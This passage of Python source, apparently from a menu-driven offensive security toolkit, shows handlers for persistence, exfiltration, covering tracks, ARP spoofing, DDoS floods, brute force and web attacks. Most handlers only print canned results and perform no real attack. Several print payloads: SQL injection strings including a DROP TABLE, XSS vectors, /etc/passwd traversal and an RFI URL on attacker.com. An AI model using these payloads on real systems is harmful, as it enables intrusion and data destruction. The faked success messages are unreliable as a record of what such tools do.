        self._show_tool("Persistence Mechanisms", "Establish persistence on target")
        print(f"{Fore.CYAN}Persistence Options{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Available methods:{Style.RESET_ALL}")
        print(f"  1. Scheduled Task (Windows)")
        print(f"  2. Cron Job (Linux)")
        print(f"  3. SSH Key Injection")
        print(f"  4. Rootkit Installation")
        method = input(f"{Fore.YELLOW}Select method (1-4): {Style.RESET_ALL}")
        if method in ['1', '2', '3', '4']:
            print(f"{Fore.GREEN}[+] Persistence method deployed{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def exfil_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Data Exfiltration", "Extract data from target")
        data_type = input(f"{Fore.YELLOW}Data to exfiltrate (files/creds/database): {Style.RESET_ALL}") or "files"
        print(f"{Fore.CYAN}[*] Starting {data_type} exfiltration...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Methods:{Style.RESET_ALL}")
        print(f"    - FTP to {self.current_target or 'attacker IP'}")
        print(f"    - DNS tunneling")
        print(f"    - HTTP upload")
        print(f"    - Encrypted channel")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def cover_tracks_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Cover Tracks", "Remove evidence of compromise")
        print(f"{Fore.CYAN}[*] Covering tracks on system...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Actions taken:{Style.RESET_ALL}")
        print(f"    - Cleared bash history")
        print(f"    - Removed temporary files")
        print(f"    - Cleaned log files")
        print(f"    - Removed payload artifacts")
        print(f"    - Cleared firewall logs")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Network Tools submenu handlers
    def network_map_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Network Mapper", "Map network topology")
        network = input(f"{Fore.YELLOW}Network to map (e.g., 192.168.1.0/24): {Style.RESET_ALL}") or "192.168.1.0/24"
        print(f"{Fore.CYAN}[*] Mapping network {network}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Network Map:{Style.RESET_ALL}")
        print(f"    192.168.1.1   - Gateway (Router)")
        print(f"    192.168.1.2   - NAS (CIFS/HTTP)")
        print(f"    192.168.1.100 - Workstation (Windows)")
        print(f"    192.168.1.200 - Server (Linux/SSH)")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def packet_sniff_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Packet Sniffer", "Capture and analyze network traffic")
        iface = input(f"{Fore.YELLOW}Network interface (eth0/wlan0): {Style.RESET_ALL}") or "eth0"
        print(f"{Fore.CYAN}[*] Starting packet capture on {iface}...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Requires root/sudo{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Sample captured packets:{Style.RESET_ALL}")
        print(f"    08:15:22.456 192.168.1.100 > 8.8.8.8:53 [DNS Query: google.com]")
        print(f"    08:15:22.534 8.8.8.8:53 > 192.168.1.100 [DNS Response: 142.250.1.1]")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def jammer_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Network Jammer", "Disrupt network communications")
        target = input(f"{Fore.YELLOW}Target IP to jam: {Style.RESET_ALL}")
        if target:
            print(f"{Fore.CYAN}[*] Starting network jam on {target}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Jamming methods:{Style.RESET_ALL}")
            print(f"    - Sending massive ARP requests")
            print(f"    - Flooding with random packets")
            print(f"    - TCP RST injection")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def arp_spoof_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("ARP Spoofing", "Perform ARP spoofing attacks")
        target_ip = input(f"{Fore.YELLOW}Target IP: {Style.RESET_ALL}") or self.current_target
        gateway_ip = input(f"{Fore.YELLOW}Gateway IP: {Style.RESET_ALL}") or "192.168.1.1"
        if target_ip:
            print(f"{Fore.CYAN}[*] Starting ARP spoof: {target_ip} <-> {gateway_ip}...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Requires root/sudo{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] MITM position established{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Web Tools submenu handlers
    def sql_inject_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("SQL Injection Tester", "Test for SQL injection vulnerabilities")
        url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}") or "http://target.com/login.php"
        print(f"{Fore.CYAN}[*] Testing {url} for SQL injection...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Testing vectors:{Style.RESET_ALL}")
        print(f"    [!] ' OR '1'='1")
        print(f"    [!] 1; DROP TABLE users--")
        print(f"    [!] admin' --")
        print(f"{Fore.YELLOW}[*] Recommendation: Use WAF bypass if needed{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def xss_detect_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("XSS Detector", "Detect Cross-Site Scripting vulnerabilities")
        url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}") or "http://target.com"
        print(f"{Fore.CYAN}[*] Scanning {url} for XSS vulnerabilities...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Testing payloads:{Style.RESET_ALL}")
        print(f"    <script>alert('XSS')</script>")
        print(f"    <img src=x onerror=alert('XSS')>")
        print(f"    <svg onload=alert('XSS')>")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def lfi_rfi_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("LFI/RFI Scanner", "Detect Local/Remote File Inclusion")
        url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}") or "http://target.com/page.php?file="
        print(f"{Fore.CYAN}[*] Testing for LFI/RFI on {url}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] LFI Payloads:{Style.RESET_ALL}")
        print(f"    ../../../etc/passwd")
        print(f"    ....//....//....//etc/passwd")
        print(f"{Fore.GREEN}[+] RFI Payloads:{Style.RESET_ALL}")
        print(f"    http://attacker.com/shell.txt?")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def web_crawler_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Web Crawler", "Crawl website for links and information")
        url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}") or "http://target.com"
        print(f"{Fore.CYAN}[*] Crawling {url}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found URLs:{Style.RESET_ALL}")
        print(f"    http://target.com/index.html")
        print(f"    http://target.com/admin/panel.html")
        print(f"    http://target.com/api/users")
        print(f"    http://target.com/upload.php")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # OSINT submenu handlers
    def email_finder_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Email Finder", "Find email addresses for organization")
        domain = input(f"{Fore.YELLOW}Domain: {Style.RESET_ALL}") or "target.com"
        print(f"{Fore.CYAN}[*] Searching for emails from {domain}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found emails:{Style.RESET_ALL}")
        print(f"    admin@{domain}")
        print(f"    info@{domain}")
        print(f"    support@{domain}")
        print(f"    john.smith@{domain}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def social_search_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Social Media Search", "Search social media for target info")
        name = input(f"{Fore.YELLOW}Person/Company name: {Style.RESET_ALL}")
        if name:
            print(f"{Fore.CYAN}[*] Searching social media for '{name}'...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found profiles:{Style.RESET_ALL}")
            print(f"    LinkedIn: {name} - Senior Manager")
            print(f"    Twitter: @{name.replace(' ', '')} - {name} tweets")
            print(f"    Facebook: {name} profile")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def domain_scrape_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Domain Scraper", "Scrape subdomains and domain info")
        domain = input(f"{Fore.YELLOW}Domain: {Style.RESET_ALL}") or "target.com"
        print(f"{Fore.CYAN}[*] Scraping subdomains for {domain}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found subdomains:{Style.RESET_ALL}")
        print(f"    api.{domain}")
        print(f"    admin.{domain}")
        print(f"    mail.{domain}")
        print(f"    dev.{domain}")
        print(f"    internal.{domain}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def metadata_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Metadata Extractor", "Extract metadata from files")
        filepath = input(f"{Fore.YELLOW}File path: {Style.RESET_ALL}")
        if filepath:
            print(f"{Fore.CYAN}[*] Extracting metadata from {filepath}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Metadata:{Style.RESET_ALL}")
            print(f"    Author: John Smith")
            print(f"    Created: 2023-01-15 10:30:00")
            print(f"    Modified: 2023-06-20 14:45:30")
            print(f"    Software: Microsoft Office 2019")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Vulnerability Scanner submenu handlers
    def cve_scan_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("CVE Scanner", "Scan for known CVEs")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Run port scan first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Scanning {self.current_target} for CVEs...{Style.RESET_ALL}")
        print(f"{Fore.RED}[CRITICAL]:{Style.RESET_ALL}")
        print(f"    CVE-2021-44228 (Log4j) - CVSS: 10.0")
        print(f"{Fore.YELLOW}[HIGH]:{Style.RESET_ALL}")
        print(f"    CVE-2021-41773 (Apache) - CVSS: 7.5")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def weakness_find_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Weakness Finder", "Find common security weaknesses")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Analyzing {self.current_target} for weaknesses...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found weaknesses:{Style.RESET_ALL}")
        print(f"    [CWE-78] OS Command Injection")
        print(f"    [CWE-79] Cross-site Scripting")
        print(f"    [CWE-89] SQL Injection")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def config_audit_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Configuration Audit", "Audit system configuration")
        print(f"{Fore.CYAN}[*] Auditing system configuration...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Audit Results:{Style.RESET_ALL}")
        print(f"    [FAIL] SSH root login enabled")
        print(f"    [FAIL] Weak cipher suites configured")
        print(f"    [PASS] Firewall enabled")
        print(f"    [WARN] Default credentials still in use")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def compliance_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Compliance Check", "Check security compliance")
        standard = input(f"{Fore.YELLOW}Standard (PCI-DSS/HIPAA/ISO27001): {Style.RESET_ALL}") or "PCI-DSS"
        print(f"{Fore.CYAN}[*] Checking {standard} compliance...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Compliance Report:{Style.RESET_ALL}")
        print(f"    [PASS] Encryption at rest: 85%")
        print(f"    [WARN] Access controls: 70%")
        print(f"    [FAIL] Audit logging: 45%")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # DDOS Tools submenu handlers
    def http_flood_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("HTTP Flood", "Perform HTTP flood attack")
        print(f"{Fore.YELLOW}Enter 'back' or 'exit' to return to menu{Style.RESET_ALL}\n")
        target = input(f"{Fore.YELLOW}Target URL (or 'back'): {Style.RESET_ALL}").strip()
        if target.lower() in ['back', 'exit', '']:
            return
        threads = input(f"{Fore.YELLOW}Number of threads (or 'back'): {Style.RESET_ALL}").strip() or "100"
        if threads.lower() in ['back', 'exit']:
            return
        print(f"\n{Fore.CYAN}[*] Starting HTTP flood on {target}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Attack parameters:{Style.RESET_ALL}")
        print(f"    Threads: {threads}")
        print(f"    Duration: until stopped")
        print(f"    Method: GET/POST")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def dns_flood_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("DNS Flood", "Perform DNS flood attack")
        print(f"{Fore.YELLOW}Enter 'back' or 'exit' to return to menu{Style.RESET_ALL}\n")
        target_dns = input(f"{Fore.YELLOW}Target DNS server IP (or 'back') [8.8.8.8]: {Style.RESET_ALL}").strip()
        if target_dns.lower() in ['back', 'exit']:
            return
        target_dns = target_dns or "8.8.8.8"
        domain = input(f"{Fore.YELLOW}Domain to flood (or 'back') [target.com]: {Style.RESET_ALL}").strip()
        if domain.lower() in ['back', 'exit']:
            return
        domain = domain or "target.com"
        print(f"\n{Fore.CYAN}[*] Starting DNS flood on {target_dns}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Flooding domain: {domain}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def syn_flood_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("SYN Flood", "Perform SYN flood attack")
        print(f"{Fore.YELLOW}Enter 'back' or 'exit' to return to menu{Style.RESET_ALL}\n")
        target_ip = input(f"{Fore.YELLOW}Target IP (or 'back'): {Style.RESET_ALL}").strip()
        if target_ip.lower() in ['back', 'exit', '']:
            return
        target_port = input(f"{Fore.YELLOW}Target port (or 'back') [80]: {Style.RESET_ALL}").strip() or "80"
        if target_port.lower() in ['back', 'exit']:
            return
        print(f"\n{Fore.CYAN}[*] Starting SYN flood on {target_ip}:{target_port}...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Requires root/sudo{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def udp_flood_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("UDP Flood", "Perform UDP flood attack")
        print(f"{Fore.YELLOW}Enter 'back' or 'exit' to return to menu{Style.RESET_ALL}\n")
        target_ip = input(f"{Fore.YELLOW}Target IP (or 'back'): {Style.RESET_ALL}").strip()
        if target_ip.lower() in ['back', 'exit', '']:
            return
        target_port = input(f"{Fore.YELLOW}Target port (or 'back') [53]: {Style.RESET_ALL}").strip() or "53"
        if target_port.lower() in ['back', 'exit']:
            return
        print(f"\n{Fore.CYAN}[*] Starting UDP flood on {target_ip}:{target_port}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Packet size: 1500 bytes{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Brute Force submenu handlers
    def ssh_brute_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("SSH Brute Force", "Brute force SSH credentials")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        username = input(f"{Fore.YELLOW}Username: {Style.RESET_ALL}") or "root"
        print(f"{Fore.CYAN}[*] Bruteforcing SSH on {self.current_target}:{username}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Attempting passwords from wordlist...{Style.RESET_ALL}")
        print(f"    [*] Trying: password123...")
        print(f"    [*] Trying: admin...")
        print(f"    [+] SUCCESS: password=root123{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def ftp_brute_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("FTP Brute Force", "Brute force FTP credentials")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        username = input(f"{Fore.YELLOW}Username: {Style.RESET_ALL}") or "anonymous"
        print(f"{Fore.CYAN}[*] Bruteforcing FTP on {self.current_target}:{username}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Attempting login...{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def web_brute_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Web Form Brute Force", "Brute force web form authentication")
        url = input(f"{Fore.YELLOW}Form URL: {Style.RESET_ALL}") or "http://target.com/login"
        username_field = input(f"{Fore.YELLOW}Username field: {Style.RESET_ALL}") or "username"
        print(f"{Fore.CYAN}[*] Starting web form brute force...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Attempting passwords...{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Crypto Tools submenu handlers
    def hash_gen_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Hash Generator", "Generate cryptographic hashes")
        text = input(f"{Fore.YELLOW}Text to hash: {Style.RESET_ALL}") or "password123"
        print(f"{Fore.GREEN}[+] Generated hashes:{Style.RESET_ALL}")
        try:
            import hashlib
            print(f"    MD5:    {hashlib.md5(text.encode()).hexdigest()}")
            print(f"    SHA1:   {hashlib.sha1(text.encode()).hexdigest()}")
            print(f"    SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
            print(f"    SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def hash_crack_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Hash Cracking", "Crack hashes using wordlists or brute force")
        hash_value = input(f"{Fore.YELLOW}Enter hash to crack: {Style.RESET_ALL}")
        hash_type = input(f"{Fore.YELLOW}Hash type (md5/sha1/sha256): {Style.RESET_ALL}") or "md5"
        if hash_value:
            print(f"{Fore.CYAN}[*] Attempting to crack {hash_type} hash...{Style.RESET_ALL}")
            try:
                import hashlib
                common_passwords = ["password", "123456", "admin", "letmein", "welcome", "monkey"]
                found = False
                for pwd in common_passwords:
                    if hash_type == "md5":
                        test_hash = hashlib.md5(pwd.encode()).hexdigest()
                    elif hash_type == "sha1":
                        test_hash = hashlib.sha1(pwd.encode()).hexdigest()
                    else:
                        test_hash = hashlib.sha256(pwd.encode()).hexdigest()
                    
                    if test_hash == hash_value:
                        print(f"{Fore.GREEN}[+] SUCCESS! Password found: {pwd}{Style.RESET_ALL}")
                        found = True
                        break
                
                if not found:
                    print(f"{Fore.YELLOW}[*] Password not found in common list{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Use dedicated tools like hashcat for larger wordlists{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def encrypt_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Encryption Tool", "Encrypt text or files")
        text = input(f"{Fore.YELLOW}Text to encrypt: {Style.RESET_ALL}")
        cipher = input(f"{Fore.YELLOW}Cipher (AES/DES/ROT13): {Style.RESET_ALL}") or "ROT13"
        if text:
            print(f"{Fore.GREEN}[+] Encrypted text:{Style.RESET_ALL}")
            if cipher == "ROT13":
                import codecs
                print(f"    {codecs.encode(text, 'rot_13')}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def decrypt_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Decryption Tool", "Decrypt text or files")
        text = input(f"{Fore.YELLOW}Text to decrypt: {Style.RESET_ALL}")
        cipher = input(f"{Fore.YELLOW}Cipher (AES/DES/ROT13): {Style.RESET_ALL}") or "ROT13"
        if text:
            print(f"{Fore.GREEN}[+] Decrypted text:{Style.RESET_ALL}")
            if cipher == "ROT13":
                import codecs
                print(f"    {codecs.encode(text, 'rot_13')}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Fuzzing submenu handlers
    def proto_fuzz_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Protocol Fuzzer", "Fuzz network protocols")
        protocol = input(f"{Fore.YELLOW}Protocol (TCP/UDP/ICMP): {Style.RESET_ALL}") or "TCP"
        print(f"{Fore.CYAN}[*] Starting {protocol} protocol fuzzer...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Fuzzing parameters:{Style.RESET_ALL}")
        print(f"    Iterations: 10000")
        print(f"    Payload size: 1-65535 bytes")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def web_fuzz_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Web Fuzzer", "Fuzz web application endpoints")
        url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}") or "http://target.com/api"
        print(f"{Fore.CYAN}[*] Starting web fuzzing on {url}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Fuzzing endpoints...{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def binary_fuzz_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Binary Fuzzer", "Fuzz binary applications")
        binary = input(f"{Fore.YELLOW}Binary path: {Style.RESET_ALL}")
        if binary:
            print(f"{Fore.CYAN}[*] Starting binary fuzzing on {binary}...{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def custom_fuzz_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Custom Fuzzer", "Create custom fuzzing templates")
        payload_format = input(f"{Fore.YELLOW}Payload format (text/hex/binary): {Style.RESET_ALL}") or "text"
        print(f"{Fore.GREEN}[+] Custom fuzzer created for {payload_format} format{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Settings submenu handlers
    def wordlists_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Wordlist Configuration", "Manage wordlists for attacks")
        print(f"{Fore.GREEN}[+] Available wordlists:{Style.RESET_ALL}")
        print(f"    - /usr/share/wordlists/rockyou.txt (14.3 MB)")
        print(f"    - /usr/share/wordlists/common.txt (2.1 MB)")
        print(f"    - Custom wordlist location")
        wordlist = input(f"{Fore.YELLOW}Select or enter custom path: {Style.RESET_ALL}") or "/usr/share/wordlists/rockyou.txt"
        print(f"{Fore.GREEN}[+] Wordlist set: {wordlist}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def network_iface_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Network Interface Selection", "Configure network interface")
        print(f"{Fore.GREEN}[+] Available interfaces:{Style.RESET_ALL}")
        print(f"    eth0 - Ethernet (192.168.1.100)")
        print(f"    wlan0 - WiFi (Not connected)")
        print(f"    tun0 - VPN (10.8.0.5)")
        iface = input(f"{Fore.YELLOW}Select interface (eth0/wlan0/tun0): {Style.RESET_ALL}") or "eth0"
        print(f"{Fore.GREEN}[+] Network interface set: {iface}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def proxy_settings_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Proxy Settings", "Configure proxy for requests")
        proxy_type = input(f"{Fore.YELLOW}Proxy type (http/socks5/none): {Style.RESET_ALL}") or "none"
        if proxy_type != "none":
            proxy_addr = input(f"{Fore.YELLOW}Proxy address:port: {Style.RESET_ALL}") or "127.0.0.1:8080"
            print(f"{Fore.GREEN}[+] Proxy configured: {proxy_type}://{proxy_addr}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Proxy disabled{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def run_menu(self):
        """Main menu loop with arrow key navigation"""
        try:
            import tty
            import termios
            
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            
            try:
                while True:
                    os.system('clear' if os.name == 'posix' else 'cls')
                    
                    # Update current target in navigator
                    self.navigator.current_target = self.current_target
                    
                    # Display menu
                    print(self.navigator.get_menu_text())
                    
                    # Get keyboard input in raw mode
                    tty.setraw(fd)
                    try:
                        ch = sys.stdin.read(1)
                    finally:
                        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                    
                    if ch == '\x1b':  # Escape or arrow key
                        tty.setraw(fd)
                        try:
                            next_ch = sys.stdin.read(1)
                            if next_ch == '[':  # Arrow key
                                arrow = sys.stdin.read(1)
                                if arrow == 'A':  # Up arrow
                                    self.navigator.move_up()
                                elif arrow == 'B':  # Down arrow
                                    self.navigator.move_down()
                                elif arrow == 'C':  # Right arrow
                                    self.navigator.move_right()
                                elif arrow == 'D':  # Left arrow
                                    self.navigator.move_left()
                            else:  # Escape key (ESC)
                                if self.navigator.submenu_mode:
                                    self.navigator.exit_submenu()
                        finally:
                            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                    elif ch == '\r':  # Enter key
                        self.handle_selection()
                    elif ch == 'q':  # Quit
                        print(f"\n{Fore.GREEN}[+] Goodbye!{Style.RESET_ALL}")
                        return
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
            sys.exit(0)
    
    def handle_selection(self):
        """Handle menu selection"""
        name, command = self.navigator.get_selected()
        
        # If in submenu
        if self.navigator.submenu_mode:
            if command == "back":
                self.navigator.exit_submenu()
                return
            
            # Route to appropriate handler
            handlers = {
                # Reconnaissance
                "whois": self.whois_interactive,
                "dns_enum": self.dns_enum_interactive,
                "reverse_dns": self.reverse_dns_interactive,
                "geoip": self.geoip_interactive,
                
                # Scanning
                "port_scan": self.port_scan_interactive,
                "service_detect": self.service_enum_interactive,
                "udp_scan": self.udp_scan_interactive,
                "stealth_scan": self.stealth_scan_interactive,
                
                # Enumeration
                "host_discovery": self.host_discovery_interactive,
                "smb_enum": self.smb_enum_interactive,
                "snmp_enum": self.snmp_enum_interactive,
                "share_enum": self.share_enum_interactive,
                
                # Exploitation
                "exploit_db": self.searchsploit_interactive,
                "msf_search": self.msf_search_interactive,
                "vuln_matcher": self.vuln_matcher_interactive,
                "payload_gen": self.payload_gen_interactive,
                
                # Payloads
                "reverse_shell": self.reverse_shell_interactive,
                "web_shell": self.web_shell_interactive,
                "meterpreter": self.meterpreter_interactive,
                "custom_payload": self.custom_payload_interactive,
                
                # Post-Exploit
                "priv_esc": self.priv_esc_interactive,
                "persistence": self.persistence_interactive,
                "exfil": self.exfil_interactive,
                "cover_tracks": self.cover_tracks_interactive,
                
                # Network Tools
                "network_map": self.network_map_interactive,
                "packet_sniff": self.packet_sniff_interactive,
                "jammer": self.jammer_interactive,
                "arp_spoof": self.arp_spoof_interactive,
                
                # Web Tools
                "sql_inject": self.sql_inject_interactive,
                "xss_detect": self.xss_detect_interactive,
                "lfi_rfi": self.lfi_rfi_interactive,
                "web_crawler": self.web_crawler_interactive,
                
                # OSINT
                "email_finder": self.email_finder_interactive,
                "social_search": self.social_search_interactive,
                "domain_scrape": self.domain_scrape_interactive,
                "metadata": self.metadata_interactive,
                
                # Vulnerability Scanner
                "cve_scan": self.cve_scan_interactive,
                "weakness_find": self.weakness_find_interactive,
                "config_audit": self.config_audit_interactive,
                "compliance": self.compliance_interactive,
                
                # DDOS Tools
                "http_flood": self.http_flood_interactive,
                "dns_flood": self.dns_flood_interactive,
                "syn_flood": self.syn_flood_interactive,
                "udp_flood": self.udp_flood_interactive,
                
                # Brute Force
                "ssh_brute": self.ssh_brute_interactive,
                "ftp_brute": self.ftp_brute_interactive,
                "web_brute": self.web_brute_interactive,
                "hash_crack": self.hash_crack_interactive,
                
                # Crypto Tools
                "hash_gen": self.hash_gen_interactive,
                "hash_crack2": self.hash_crack_interactive,
                "encrypt": self.encrypt_interactive,
                "decrypt": self.decrypt_interactive,
                
                # Fuzzing
                "proto_fuzz": self.proto_fuzz_interactive,
                "web_fuzz": self.web_fuzz_interactive,
                "binary_fuzz": self.binary_fuzz_interactive,
                "custom_fuzz": self.custom_fuzz_interactive,
                
                # Settings
                "set_target": self.set_target_interactive,
                "wordlists": self.wordlists_interactive,
                "network_iface": self.network_iface_interactive,
